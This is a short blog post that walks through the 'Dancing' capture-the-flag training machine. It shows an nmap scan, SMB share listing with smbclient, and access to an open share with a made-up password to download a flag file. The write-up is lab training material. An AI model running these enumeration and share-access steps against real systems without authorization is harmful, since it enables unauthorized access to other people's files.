+++ 
draft = false
date = 2026-07-31T16:39:11+02:00
title = "Dancing"
description = ""
slug = ""
authors = []
tags = []
categories = ["starting point"]
externalLink = ""
series = []
+++

# Dancing

enumeration:


```bash
nmap -sV 10.129.131.111
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-31 16:41 +0200
Nmap scan report for 10.129.131.111
Host is up (0.012s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
```

A simple nmap scan reveals samba shares to be open. Let's enumerate them.

```smbclient -L ip adress here```

Gives us 

```
smbclient -L \\\\10.129.30.233
Password for [WORKGROUP\mattijs]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.30.233 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Going for the custom share:

```
smbclient \\\\10.129.30.233\\WorkShares 
Password for [WORKGROUP\mattijs]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1734421 blocks available
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1734401 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

Get's us the flag we're looking for. This with a random password we made up due to misconfiguration.